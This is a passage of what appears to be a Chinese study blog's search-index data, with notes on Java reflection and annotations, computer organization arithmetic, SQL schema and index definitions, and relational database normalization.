cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport cn.itclass.domain.Student;\n\npublic class ReflectDemo1 &#123;\n\n    public static void main(String[] args) throws Exception &#123;\n        //1.Class.forName(\"全类名\")\n        Class cls1 = Class.forName(\"cn.itclass.domain.Person\");\n        System.out.println(cls1);\n        //2.类名.class\n        Class cls2 = Person.class;\n        System.out.println(cls2);\n        //3.对象.getClass()\n        Person p = new Person();\n        Class cls3 = p.getClass();\n        System.out.println(cls3);\n\n        //==比较这三个对象\n        System.out.println(cls1 == cls2); //true\n        System.out.println(cls1 == cls3); //true\n\n        Class cls4 = Student.class;\n        System.out.println(cls1 == cls4); //false\n    &#125;\n&#125;\n# 2.2 Class 对象功能\n\n获取功能：\n\n获取成员变量们\n\nField [] getFields ()：获取所有 public 修饰的成员变量\nField getField (String name)：获取指定名称的 public 修饰的成员变量\nField [] getDeclaredFields ()：获取所有成员变量，不考虑访问修饰符\nField getDeclaredField (String name)：获取指定名称的成员变量，不考虑访问修饰符\n\n\n获取构造方法们\n\nConstructer&lt;?&gt;[] getConstructors ()：获取所有 public 修饰的构造方法\nConstructer&lt;T&gt; getConstructor (类 &lt;?&gt;… parameterTypes)：获取指定 public 修饰构造方法，这里要的参数是构造参数对象\nConstructer&lt;?&gt;[] getDeclaredConstructors ()：获取所有构造方法，不考虑访问修饰符\nConstructer&lt;T&gt; getDeclaredConstructor (类 &lt;?&gt;… parameterTypes)：获取指定构造方法，不考虑访问修饰符\n\n\n获取成员方法们\n\nMethod [] getMethods ()：获取所有 public 修饰的方法\nMethod getMethod ()：获取指定 public 方法，参数为方法名和参数列表\nMethod [] getDeclaredMethods ()：获取所有方法，不考虑访问修饰符\nMethod getDeclaredMethod ()：获取指定方法，不考虑访问修饰符，参数为方法名和参数列表\n\n\n获取类名\n\nString getName()\n\n\n\n\nField：成员变量\n\n操作：\n\n设置值\n\nset (Object obj, Object value)：给 obj 对象设置 value 值\n\n\n获取值\n\nget (Object obj)：获取指定对象的值，比如 get§，获取的是 p 里的这个成员变量的值\n\n\n忽略访问权限修饰符的安全检查\n\nsetAccessible (true)：暴力反射，Field 对象中的方法\n\n\n\n\n\n\nConstructor：构造方法\n\n创建对象：T newInstance (Object … initargs)\n如果使用空参数构造方法创建对象，操作可以简化：Class 对象的 newInstance\n\n\nMethod：方法\n\n执行方法：invoke (Object obj, Object… args)，参数为对象和实际参数列表\n获取方法名称：\n\nString getName：获取方法名\n\n\n\n\n获取类名\n\nClass 对象.getName; 获取的是全类名\n\n\n\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport java.lang.reflect.Field;\n\n/*获取成员变量*/\npublic class ReflectDemo2 &#123;\n    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException &#123;\n        //0.获取person的class对象\n        Class&lt;Person> personClass = Person.class;\n        //1.Field[] getFields()\n        Field[] fields = personClass.getFields();\n        for (Field field:fields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //2.Field getField(String name)\n        Field a = personClass.getField(\"a\");\n        System.out.println(a);\n        //获取成员变量a的值\n        Person p = new Person();\n        Object value = a.get(p);\n        System.out.println(value);\n        a.set(p,\"张三\");\n        System.out.println(p);\n        System.out.println(\"===============================\");\n\n        //3.Field[] getDeclaredFields()\n        Field[] declaredFields = personClass.getDeclaredFields();\n        for(Field field : declaredFields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //4.Field getDeclaredField(String name)\n        Field d = personClass.getDeclaredField(\"d\");\n        //忽略访问权限修饰符的安全检查\n        d.setAccessible(true);//暴力反射\n        Object o = d.get(p);\n        System.out.println(o);\n    &#125;\n\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\n/*获取构造方法*/\npublic class ReflectDemo3 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;\n        //0.获取Person的Class对象\n        Class personClass = Person.class;\n        //1.Constructer&lt;?>[] getConstructors()\n        Constructor[] constructors = personClass.getConstructors();\n        //2.Constructer\\&lt;T\\> getConstructor(类&lt;?>... parameterTypes)\n        Constructor constructor = personClass.getConstructor(String.class, int.class);\n        System.out.println(constructor);\n        //创建对象\n        Object person = constructor.newInstance(\"张三\", 23);\n        System.out.println(person);\n        Constructor constructor1 = personClass.getConstructor();\n        Object person2 = constructor1.newInstance();\n        System.out.println(person2);\n        //空参构造（已过时）\n        Object o = personClass.newInstance();\n        System.out.println(o);\n\n    &#125;\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class ReflectDemo4 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;\n        Class&lt;Person> personClass = Person.class;\n        /**\n         获取成员方法们\n\n         1. 获取所有方法：Method[] getMethods()\n         2. 获取指定方法：Method getMethod()\n         3. Method[] getDeclaredMethods()\n         4. Method getDeclaredMethod()\n         */\n        //获取指定名称的方法\n        Method eat = personClass.getMethod(\"eat\");\n        Person p = new Person();\n        eat.invoke(p);\n\n        Method eat1 = personClass.getMethod(\"eat\", String.class);\n        eat1.invoke(p,\"hello\");\n\n        //获取所有方法\n        Method[] methods = personClass.getMethods();\n        for(Method m : methods) &#123;\n            System.out.println(m);\n            m.setAccessible(true);\n            String name = m.getName();\n            System.out.println(name);\n        &#125;\n\n        String name = personClass.getName();\n        System.out.println(name);\n    &#125;\n&#125;\n\n# 2.3 反射案例\n\n需求：写一个 &quot;框架&quot;，不能改变该类的任何代码的前提下，可以帮我们创建任意类的对象，并且可以执行任意类的方法\n\n实现：\n\n配置文件\n反射\n\n\n步骤：\n\n将需要创建的对象的全类名和需要执行的方法定义在配置文件中\n在程序中加载读取配置文件\n使用反射技术来加载类文件进内存\n创建对象\n执行方法\n\n\n\n\n\npackage cn.itclass.reflect;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\n/**\n * 假设的框架类\n */\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n//        Person p = new Person();\n//        p.eat();\n\n        //1.加载配置文件\n        //1.1创建Properties对象\n        Properties pro = new Properties();\n        //1.2加载配置文件，转换为一个集合\n        //1.2.1获取ckass目录下的配置文件\n        ClassLoader classLoader = ReflectTest.class.getClassLoader();\n        InputStream is = classLoader.getResourceAsStream(\"pro.properties\");\n        pro.load(is);\n\n        //2.获取配置文件中定义的数据\n        String className = pro.getProperty(\"className\");\n        String methodName = pro.getProperty(\"methodName\");\n\n        //3.加载该类进内存\n        Class&lt;?> cls = Class.forName(className);\n\n        //4.创建对象\n        Object o = cls.newInstance();\n\n        //5.获取方法对象\n        Method method = cls.getMethod(methodName);\n\n        //6.执行方法\n        method.invoke(o);\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n注：类加载器没学，回头补上\n# 3、注解\n\n概念：说明程序的，给计算机看的\n注释：用文字描述程序的。给程序员看的\n概念描述：\n\nJDK1.5 之后的新特性\n说明程序的\n使用注解：@注解名称\n\n\n作用分类：\n\n编写文档：通过代码里标识的注解生成文档【生成文档 doc 文档】\n代码分析：通过代码里标识的注解对代码进行分析【使用反射】—— 经常使用\n编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】\n\n\n\n# 3.1 JDK 中预定义的一些注解\n\n@Override：监测点被该注解标注的方法是否是继承自父类（接口）的\n@Depreciated：该注解标注的内容已过时，\n@SuppressWarnings：压制警告 ——@SuppressWarnings (“all”)，一般传 all，写在类上\n\n# 3.2 自定义注解\n\n\n格式：\n\n元注解\npublic @interface 注解名称 {属性列表}\n\n\n\n本质：注解本质上就是一个接口，该接口默认继承 Annotation 接口\n\npublic interface MyAnno extends java.lang.annotation.Annotation{}\n\n\n\njava 反编译命令：javap java.class 文件\n\n\n属性：接口中可以定义的一成员方法\n\n\n要求：\n\n\n属性的返回值类型有下列取值，其他不行\n\n\n基本数据类型（void 不行）\n\n\nString\n\n\n枚举\n\n\n注解\n\n\n以上类型的数组\n\n\n\n\n定义了属性，在使用时需要给属性赋值\n\n\n如果定义属性时，使用 default 关键字给属性默认初始化值，则使用注解时可以不进行属性的赋值\n\n\n如果只有一个属性需要赋值，并且属性的名称是 value，则 value 可以省略，直接定义值即可\n定义：String name () default “张三”;\t使用：@MyAnno (name = “李四”);\n\n\n数组赋值时值使用大括号包裹。如果数组中只有一个值，则大括号可以省略\n\n\n\n\n\n\n\n\n元注解：用于描述注解的注解\n\n@Target：描述注解能够作用的位置\n\nElementType 取值：\n\nTYPE: 可以作用于类上\nMETHOD: 可以作用于方法上\nFIELD: 可以作用于成员变量上\n\n\n\n\n@Retention：描述注解被保留的阶段\n\n@Retention (RetentionPolicy.RUNTIME)：当前被描述的注解会保留到 class 字节码文件中并被 JVM 读取到\n\n\n@Documented：描述注解是否被抽取到 API 文档中\n@Inherited：描述注解是否被类的子类继承\n\n\n\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.*;\n\n/**\n * 元注解：用于描述注解的注解\n     - @Target：描述注解能够作用的位置\n     - @Retention：描述注解被保留的阶段\n     - @Documented：描述注解是否被抽取到API文档中\n     - @Inherited：描述注解是否被子类继承\n */\n@Target(value = &#123;ElementType.TYPE,ElementType.METHOD&#125;)//表示该MyAnno3只能作用于类上\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\npublic @interface MyAnno3 &#123;\n&#125;\n# 3.3 在程序中使用（解析）注解：获取注解中定义的属性值\n\n获取注解定义的位置的对象\tClass/Method/Field 对象\n获取指定的注解\n\ngetAnnotation(Class)\n这行命令执行后其实就是在内存中生成了一个该注解接口的子类实现对象\n\n\n调用注解中的抽象方法来获取配置的属性值\n\npackage cn.itclass.annocation;\n\nimport java.io.IOException;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\n/**\n * 假设的框架类\n */\n@Pro(className = \"cn.itclass.annocation.Demo1\",methodName = \"show\")\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n        //1.解析注解\n        //1.1获取该类的字节码文件对象\n        Class&lt;ReflectTest> reflectTestClass = ReflectTest.class;\n        //2.获取上边的注释对象\n        //其实就是在内存中生成了一个该注解接口的子类实现对象\n        Pro annotation = reflectTestClass.getAnnotation(Pro.class);\n        //3.调用注解对象中定义的抽象方法，获取返回值\n        String className = annotation.className();\n        String methodName = annotation.methodName();\n        System.out.println(className);\n        System.out.println(methodName);\n\n        //下面与reflect一样\n        Class&lt;?> aClass = Class.forName(className);\n        Object o = aClass.newInstance();\n\n        Method method = aClass.getMethod(\"show\");\n        method.invoke(o);\n    &#125;\n&#125;\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * 描述需要去执行的类名，和方法名\n */\n@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Pro &#123;\n    String className();\n    String methodName();\n&#125;\n# 3.4 小结\n\n以后大多数时候会使用注解，而不是自定义注解\n注解给谁用？\n\n编译器\n给解析程序用\n\n\n注解不是程序的一部分，可以理解为注解就是一个标签\n\n","slug":"junit、注解、反射","date":"2022-06-19T12:28:37.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"460b9e3a35727b706e187bd7c49b4015","title":"计算机组成原理-数据的表示和运算-2","content":"# 移位运算\n\n# 算数移位\n\n\n移动小数点相当于改变每个位的位权\n移位：通过改变各个数码位和小数点的相对位置，从而改变各个数码位的位权。可以用移位运算实现乘法、除法\n\n# 原码的算数移位\n原码的算数移位：符号位保持不变，仅对数值位进行移位\n右移：高位补 0，低位舍弃，若舍弃的位等于 0，则相当于除以 2，若舍弃的位不等于 0，则会丢失精度\n\n左移：低位补 0，高位舍弃，若舍弃的位等于 0，则相当于 ×2，若舍弃的位不等于 0，则会出现严重误差\n\n原码表示的定点小数与定点整数一个效果\n# 反码的算数移位\n正数的反码移位：正数的反码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的反码移位\n\n反码尾数部分和原码是完全相反的，\n右移：高位补 1，低位舍弃\n左移：低位补 1，高位舍弃\n\n# 补码的算数移位\n正数的补码移位：正数的补码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的补码移位\n\n补码是从反码的基础上末位 + 1 得到的\n补码的规律为：从右往左到第一个 1 为止，后半部分与原码相同，前半部分和反码相同\n\n\n\n右移：高位补 1，低位舍弃\n左移：低位补 0，高位舍弃\n\n# 算数移位总结\n\n# 算数移位的应用举例\n\n\n# 循环移位\n在循环移位的时候整个二进制字符串是进行循环补位的\n\n循环左移\n带进位位的循环左移\n\n\n\n循环移位的操作很适合把一个数字的低字节和高字节进行调换\n# 知识点回顾\n\n# 定点数原码乘法运算\n\n手算乘法（十进制）\n\n手算乘法（二进制）\n\n考虑用及其实现：\n\n实际数字有正负，符号位如何处理？\n乘积的位数扩大一倍，如何处理？\n4 个位积都要保存下来最后统一相加？\n\n# 原码一位乘法\n符号位单独处理：符号位等于 x 的符号位异或 y 的符号位\n数值位取绝对值进行乘法计算\n\n\nMQ 存放乘数和积的低位\nX 里存放被乘数\nACC 存放乘积高位\n如果 MQ 的最低位为 1，ACC 就加上 X 中的值，如果 MQ 的最低位为 0，就不进行相加\n相加结束之后 ACC 和 MQ 整体右移一位，循环上述操作\n乘数的符号位不用参与运算\n小数点隐含在积的符号位的右边\n\n\n# 原码一位乘法（手算模拟）\n\n原码整数的乘法与小数的运算方法是一致的，注意一下小数点的位置即可\n# 定点数补码的乘法运算\n# 补码的一位乘法\n设机器字长为 5 位（含符号位，n=4），x=-0.1101, y=+0.1011，采用 Booth 算法求 x・y\n原码一位乘法\n\n进行 n 轮加法、移位\n每轮可能加 x 绝对值，可能加 0，具体要看 MQ 的最低位的值\n每次移位是 “逻辑右移”\n符号位不参与运算\n\n补码一位乘法\n\n进行 n 论加法、移位，最后再多来一次加法\n可能加 0，可能加 [x] 补，可能加 [-x] 补，根据当前 MQ 的最低位和辅助位来确定加什么\n\n辅助位 - MQ 中最低位 = 1 时，(ACC)+[X] 补\n辅助位 - MQ 中最低位 = 0 时，(ACC)+0\n辅助位 - MQ 中最低位 =-1 时，(ACC)+[-X] 补\n\n\n每次移位是 “补码的算数右移”—— 算数右移：符号位保持不动，数字右移\n符号位参与运算\n\n补码的一位乘法（手算模拟）\nMQ 需要多一位做辅助位，辅助位初始为 0，每次右移会使 MQ 的最低位顶替原本的辅助位，随之 ACC 和 X 都是双符号位\n\n# 定点数原码除法运算\n\n# 手算除法（十进制）\n\n手算除法（二进制）\n\n# 原码除法：恢复余数法\n符号位单独处理：被除数和除数的符号位异或\n数值拉取绝对值进行除法计算\n写出 x,y 的原码，y 的补码，[-y] 补\n\n\n每次上商的时候默认会商 1，然后会把 ACC 和通用寄存器的值相减后的结果再放回 ACC 中（(ACC)+[-y] 补），如果减法运算之后符号位为 1，说明此时余数小于除数，应该商 0 的，之后计算机再将上商的值改为 0，这时 ACC 的值已经放了之前的负数，要在返回原样，就要再加上除数 [y] 补，再次覆盖 ACC\n\n\n把 ACC 和 MQ 的内容全部左移一位，进行一个错位，重复上述步骤\n\n\n\n小数点默认在第一个 0 后面，余数 = 0.0111X2^{-n}，n=4\n# 原码除法：恢复余数法（手算）\n\n# 原码除法：加减交替法（不恢复余数法）\n\n\n思路：上商为 1 相减之后出现负数直接上商 0，然后逻辑左移，加 y 补\n# 定点数补码除法运算\n# 补码除法：加减交替法\n\n符号位直接参与运算，因此不用写绝对值的补码，直接写原数的补码\n采用双符号位\n被除数和除数同号，则被除数减去除数；异号则被除数加上除数\n余数和除数同号，商 1，余数左移一位减去除数\n余数和除数异号，商 0，余数左移一位加上除数\n重复 n 次\n\n\n末位商恒置为 1\n# 除法运算总结回顾\n\n# C 语言类型转换\nC 语言中的定点整数，如 int short long 都是用补码存储的\nunsigned 表示无符号整数\n\n# 数据的存储和排列\n# 大小端模式\n\n大端：将高有效字节放在低地址，适合人类阅读\n小端：将高有效字节放在高地址，适合机器处理\n# 边界对齐\n\n转换地址就逻辑左移右移即可，每次访存只能读取一个字，且不能跨行读取\n# 浮点数的表示\n\n定点数的局限性：当所需表示的数值较大时，定点数就不能正确表示\n定点数可表示的数字范围有限，但我们不能无限制地增加数据的长度\n科学计数法：+11+3.026\n\n尾数部分越短能表示的精度就越低，阶码表示对应进制的多少次方\n\n阶码反映数值的大小，尾数反映精度\n\n# 浮点数的表示\n\n\nr: 进制，E：阶码；M：尾数\n\n# 浮点数尾数的规格化\n尾数的最高位如果是 0 就没有意义，是无效值，会丧失精度\n左规：当浮点数运算的结果为非规格化时要进行规格化处理，将尾数算数左移一位，阶码减 1\n\n右规：当浮点数运算结果的尾数出现溢出（双符号位为 01 或 10,）时，将尾数算数右移一位，阶码加 1\n\n注：采用双符号位，当溢出发生时，可以挽救。更高的符号位是正确符号位\n# 规格化浮点数的特点\n\n\n# 浮点数标准 IEEE 754\n","slug":"计算机组成原理-数据的表示和运算-2","date":"2022-06-12T00:58:10.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"02e7efbd219a0c25e416f110675eb1a9","title":"计算机组成原理-数据的表示和运算","content":"# 无符号整数的表示和运算\n# 无符号整数的加法\n按位相加\n# 无符号整数的减法\n\n被减数不变，减数全部按位取反，末位 + 1，减法变加法\n从最低位开始，按位相加，并往更高位进位\n\n# 带符号整数的表示和运算 - 原反补\n# 补码的加法运算\n当负数参与加法运算时，要将两个数全部取补码，符号位也参与运算，不需要单独处理\n# 补码的减法运算\n[A]补−[B]补=[A]补+[−B]补[A]_补-[B]_补=[A]_补+[-B]_补[A]补​−[B]补​=[A]补​+[−B]补​\n[B]补[B]_补[B]补​转[−B]补[-B]_补[−B]补​：全部位按位取反（包括符号位），末位加 1\n\n或者：找第一个 1，左边全部取反，右边不变\n例 1：19-19\n\nC 语言中 int 等带符号整数是用补码来表示的\n# 原 / 反 / 补码特性对比\n小题常见考点\n\n\n原码和反码的合法表示范围完全相同，都有两种方法表示真值 0；\n补码的合法表示范围比原码多一个负数，只有一种方式表示真值 0：\n\n如果有 8 个比特，原码和反码能够表示 - 127~127，补码可以表示 - 128~127\n补码中 - 128 的表示为：1,0000000；\n原码能表示的最小的值 - 127：1,1111111；\n-128 不能转为 - 127\n补码的真值 0 表示方法：0,0000000\n\n常见考点：A 和 B 进行某种运算后，是否发生溢出 —— 手算做题可以带入十进制验证是否超出合法范围\n# 移码表示\n\n移码：在补码的基础上符号位取反就是移码，移码只能用来表示整数\n移码的合法表示范围和补码相同，也只能有一种表示真值 0 的形式，[0] 移 = 10000000\n\n\n# 定点小数的表示和运算\n定点：小数点的符号固定\n\n# 定点小数反码、补码的转换\n\n# 定点小数的加 / 减运算\n\n# 定点小数与定点整数的区别\n\n定点小数在位数扩展时，拓展位置不一样，要加在右边\n定点小数带符号与不带符号的加法减法与定点整数一样\n# 奇偶校验码\n\n\n# 算术逻辑单元 ALU\n\n\n算术运算：加减乘除等\n逻辑运算：与或非异或等\n辅助功能：移位、求补等\n\n\n# 最基本的逻辑运算\n\n在一个复杂的逻辑表达式中，与运算的优先级大于或运算的优先级 —— 类比乘法和加法，先算与再算减，且与或运算也符合下面规律\n\nA (C+D) = AC + AD —— 分配率\nABC = A (BC) —— 结合律\nA + B + C = A + (B + C) —— 结合律\n\n\n本质上逻辑表达式是对电路的数学描述，简化逻辑表达式就是在简化电路设计\n# 复合逻辑\n\n与非就是先与再非，或非就是先或再非\n反演律：\n\nA 或 B 的非等于 A 的非与 B 的非\nA 与 B 的非等于 A 的非或 B 的非\n\n同或 ： 异或取反\n\n# 用门电路求偶校验位\n\n# 一位全加器\n\n# 串行加法器\n\n# 串行进位的并行加法器\n\n串行进位又称为行波进位，每一级进位直接依赖于前一级的进位，级进位信号是逐级形成的\n\n# 并行进位加法器\n以上的串行进位的并行加法器，下一位的结果都依赖于上一位 C 的输出，只有上一位的运算结果出来以后下一位才能进行运算，运算速度还是受进位信息产生速度的影响。\n每个进位产生的逻辑表达式:Ci=AiBi+(Ai⨁Bi)Ci−1C_i = A_iB_i + (A_i \\bigoplus B_i )C_{i-1}Ci​=Ai​Bi​+(Ai​⨁Bi​)Ci−1​，依赖于两个本位的数值和来自低位的进位，Ci-1 可以继续进行展开\n\n\n这种加法器的设计每个位的进位几乎是同时产生的\n不足：位数越多电路表达式会越复杂，一般最高到 4 位加 4 位的运算\n# 补码加减运算器\n加法器原理\n\n补码加 / 减法运算\n\nn bit 补码 X+Y，按位相加即可\nn bit 补码 X-Y：将补码 Y 全部按位取反，末位 + 1，得到 [-Y] 补，减法变加法\n\n\n无符号整数的加 / 减法也可以用该电路实现\n\n无符号数 X+Y，按位相加即可\n无符号整数 X-Y，将 Y 全部按位取反，末位 + 1，减法变加法\n\n补码加减运算和无符数的加减运算都可以用同一个运算器实现，但是溢出位的判断不同\n所以底层的硬件都是同一套逻辑，不管给的数是有符号还是无符号，因此溢出判断要进行处理\n# 标志位的生成\n\n加法器输出四个标志位的信息\n\nOF：溢出标志，只在有符号数的加减运算时有效（无符号运算时即使 OF=1，也不能说明发生了溢出）\n\nOF 的硬件逻辑：OF = 最高位的进位异或次高位的进位\n在有符号整数的运算中，如果发生了溢出，可以判断这个运算结果是错误的\n\nSF：符号标志，运算结果为正则置为 0，结果为负则置为 1\n\nSF 的硬件计算方法：SF = 最高位的本位和\nSF 位对无符号数的加减法无意义\n\nZF：零标志，运算结果为 0 时 ZF 置为 1，否则为 0\n\n对有符号数和无符号数都有意义\n\nCF：进位 / 错位标志，进位 / 错位时置 1，否则置 0\n\nCF 表示无符号数的加减法是否发生了进位或错位，只对无符号数有意义，对有符号数无意义\n\n\n\n产生借位意思为被减数不够减，要向上一位借一位，所以发生 CF 时结果是错误的，就是产生了溢出\n\n有符号整数加减运算是否产生了溢出要看 OF 位，无符号整数加减运算是否产生溢出要看 CF 位\n","slug":"计算机组成原理-数据的表示和运算","date":"2022-06-11T03:21:41.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"6b01e0a1bee5e460cbe53bebb203270e","title":"数据库-关系数据库标准语言SQL","content":"# 3.3 数据定义\n# 3.3.1 模式的定义与删除\n# 1. 定义模式\ncreate schema &lt;模式名> authorization &lt;用户名>\n例 3.1：为用户 WANG 定义一个学生 - 课程模式 S-T\ncreate schema \"S-T\" authorization WANG;\n# 2. 删除模式\ndrop schema &lt;模式名> &lt;cascade|restrict>\n# 3.3.2 基本表的定义、删除与修改\n# 1. 定义基本表\n例 3.5：建立一个学生表 Student\ncreate table student(\n    sco char(9) primary key,\n    sname char(20) unique,\n    ssex char(2),\n    sage smallint,\n    sdept char(20)\n);\n# 2. 数据类型\n# 3. 模式与表\n# 4. 修改基本表\n例 3.8：向 Student 表增加” 入学时间 “列，其数据类型为日期型\nalter table Student add S_entrance DATE;\n例 3.9：将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数\nalter table Student alter column Sage INT;\n例 3.10：增加课程名称必须取唯一值的约束条件\nalter table Student add unique(Cname);\n# 5. 删除基本表\n例 3.11：删除 Student 表\ndrop table Student cascade;\n# 3.3.3 索引的建立与删除\n# 1. 建立索引\n在 SQL 语言中，建立索引使用 CREATE INDEX 语句，其一般格式为：\nCREATE [UNIQUE][CLUSTER] INDEX 索引名 ON &lt;表名&gt;(&lt;列名&gt;[&lt;次序&gt;])\n例 3.13：为学生 - 课程数据库中的 Student、Course 和 SC 三个表建立索引。其中 Student 表按学号升序建唯一索引，Course 表按课程号升序建唯一索引，SC 表按学号升序和课程号降序建唯一索引。\ncreate unique index stusno on student(Sno);\nCREATE UNIQUE INDEX Coucno ON Course(Cno);\nCREATE UNIQUE INDEX SCno ON SC(Sno ASC, Cno DESC);\n# 2. 修改索引\n例 3.14：将 SC 表的 SCno 索引名改为 SCSno\nALTER INDEX SCno RENAME TO SCSno;\n# 3. 删除索引\nDROP INDEX Stusname;\n# 3.4 数据查询\n","slug":"数据库-关系数据库标准语言SQL","date":"2022-06-09T11:13:01.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"7c1208209b9fd71ae4c371be24b134d7","title":"数据库-关系数据理论","content":"# 6.1 问题的提出\nR(U,D,DOM,F)：\n\n关系明 R 是符号化的元组语义\nU 为一组属性\nD 为属性组 U 中的属性所来自的域\nDOM 为属性到域的映射\nF 为属性组 U 上的一组数据依赖\n\n第一范式：每一个分量必须是不可分割的数据项\n数据依赖是一个关系内部属性与属性之间的一种约束关系，是通过属性间值的相等与否体现出来的数据间相关联系。其中最重要的是函数依赖和多值依赖。\n函数依赖：比如描述一个学生的关系，可以有学号 (sno)，姓名 (sname)，系名 (sdept) 等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因而当” 学号 “的值确定之后，学生的姓名及所在的系值也就被唯一地确定了。类似的有Sname=f(sno)Sname = f(sno)Sname=f(sno)，Sdept=f(Sno)Sdept = f(Sno)Sdept=f(Sno)，即 sno 函数决定 sname，或者说 sname 函数依赖于 sno。记作Sno→SnameSno \\rightarrow SnameSno→Sname。\n一个学生例子：F=\\\n但是这个关系存在以下的问题：\n\n数据冗余\n\n如一个系的系主任名重复出现\n\n\n更新异常\n插入异常\n删除异常\n\n将这个单一的模式改造如下，分成三个关系模式：\n\nS(Sno,Sdept,Sno→Sdept)S(Sno,Sdept,Sno \\rightarrow Sdept )S(Sno,Sdept,Sno→Sdept)\nSC(Sno,Cno,Grade,(Sno,Cno)→Grade)SC(Sno,Cno,Grade,(Sno,Cno) \\rightarrow Grade)SC(Sno,Cno,Grade,(Sno,Cno)→Grade)\nDEPT(Sdept,Mname,Sdept→Mname)DEPT(Sdept,Mname,Sdept \\rightarrow Mname)DEPT(Sdept,Mname,Sdept→Mname)\n\n# 6.2 规范化\n通常按属性间依赖情况来区分关系规范化程度为第一范式、第二范式、第三范式和第四范式，然后，直观地描述如何将具有不合适性质的关系转换为更合适的形式。\n# 6.2.1 函数依赖\n定义 6.1：设 R (U) 是属性集 U 上的关系模式，X, Y 是 U 的子集。若对于 R (U) 的任意一个可能的关系 r，r 中不可能存在两个元组在 X 上的属性值相等，而在 Y 上的属性值不等，则称 X 函数确定 Y 或 Y 函数依赖于 X，记作X→YX \\rightarrow YX→Y。\n函数依赖和别的数据依赖一样是语义范畴的概念，只能根据语义来确定一个函数依赖。例如，姓名→\\rightarrow→ 年龄这个函数依赖只有在该部门没有同名人的条件下成立。\n下面介绍一些术语和记号：\n\nX→YX \\rightarrow YX→Y，但 Y 不属于 X，则称X→YX \\rightarrow YX→Y 是非平凡的函数依赖。\nX→YX \\rightarrow YX→Y，但 Y 属于 X，则称X→YX \\rightarrow YX→Y 是平凡的函数依赖。对于任一关系模式，平凡函数依赖都是必然成立的，他不反映新的语义。若不特别声明，总是讨论非平凡的函数依赖。\n若X→YX \\rightarrow YX→Y，则称 X 为这个函数依赖的决定属性组，也称为决定因素。\n若X→YX \\rightarrow YX→Y，Y→XY \\rightarrow XY→X，则记作X←→YX \\leftarrow \\rightarrow YX←→Y。\n若 Y 不函数依赖于 X，则记作X→YX \\rightarrow YX→Y，箭头加斜线\n\n定义 6.2：在 R (U) 中，如果X→YX \\rightarrow YX→Y，并且对于 X 的任何一个真子集X′X&#x27;X′，都有X′X&#x27;X′ 不函数依赖于YYY，则称 Y 对 X 完全函数依赖，记作 —&gt;F\n定义 6.3：传递函数依赖\n# 6.2.2 码\n码是关系模式中的一个重要概念。\n定义 6.4：设 K 为 R&lt;U,F&gt; 中的属性或属性集合，若 U 完全依赖于 K，则 K 为 R 的候选码。\n注意 U 是完全依赖于 K，而不是部分依赖于 K。一般地，如果 U 函数依赖于 K，即K→UK \\rightarrow UK→U，则 K 称为超码。候选码是一类特殊的超码，即候选码的超集（如果存在）一定是超码，候选码的任何真子集一定不是超码。\n若候选码多于一个，则选定其中的一个为主码。\n包含在任何一个候选码中的属性称为主属性；不包含在任何候选码中的属性称为非主属性或非码属性。最简单的情况，单个属性是码；最极端的情况，整个属性组是码，称为全码。\n定义 6.5：关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的外部码，也称外码。\n# 6.2.3 范式\n关系数据库中的关系是要满足一定的要求的，满足不同程度要求的为不同范式。\n一个低一级范式的关系模式通过模式分解可以转换为若干个高一级范式的关系模式的集合，这种过程就叫规范化。\n# 6.2.4 2NF\n定义 6.6：若R∈1NFR\\in 1NFR∈1NF，且每一个非主属性完全函数依赖于任何一个候选码，则R∈2NFR\\in 2NFR∈2NF。\n# 6.3 数据依赖的公理系统\n定义 6.11：对于满足一组函数依赖 F 的关系模式 R&lt;U,F&gt;，其任何一个关系 r，若函数依赖X→YX \\rightarrow YX→Y 都成立（即 r 中任意两元祖 t、s，若 t [X]=s [X]，则 t [X]=s [Y]），则称 F 逻辑蕴含X→YX 